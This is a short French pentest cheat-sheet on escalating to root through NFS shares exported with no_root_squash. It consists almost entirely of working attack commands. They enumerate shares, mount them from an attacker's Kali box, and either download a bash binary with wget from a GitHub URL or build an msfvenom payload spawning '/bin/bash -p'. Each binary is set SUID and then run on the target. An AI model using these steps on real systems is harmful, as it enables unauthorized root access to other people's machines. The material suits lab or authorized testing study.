# NFS

## Exploitation

L'élément critique pour ce vecteur d'escalade de privilèges est l'option `no_root_squash`

- Enumerer les partages

```sh
showmount -e <target>

cat /etc/exports
```


- Sur votre box Kali, basculez vers votre utilisateur root

- Monter l'un des partages "no_root_squash" sur notre machine attaquante et commencer à construire l'exécutable

```sh
sudo mkdir /mnt/mount_folder

sudo mount -o rw <TARGET_IP>:/<SHARE> /mnt/mount_folder

sudo mount -o rw,vers=3 <TARGET_IP>:/<SHARE> /mnt/mount_folder

sudo mount -t nfs <TARGET_IP>:/<SHARE> /mnt/mount_folder -nolock
```

- Créer un exécutable avec le bit SUID (`chmod +s nfs`) défini et l'exécuter sur le système cible.


```sh
cd /mnt/mount_folder

sudo wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

sudo chmod +xs bash
```

```sh
cd /mnt/mount_folder
sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
sudo chmod +xs shell.elf
```

```sh
/FULL_PATH/shell.elf
/FULL_PATH/bash
```
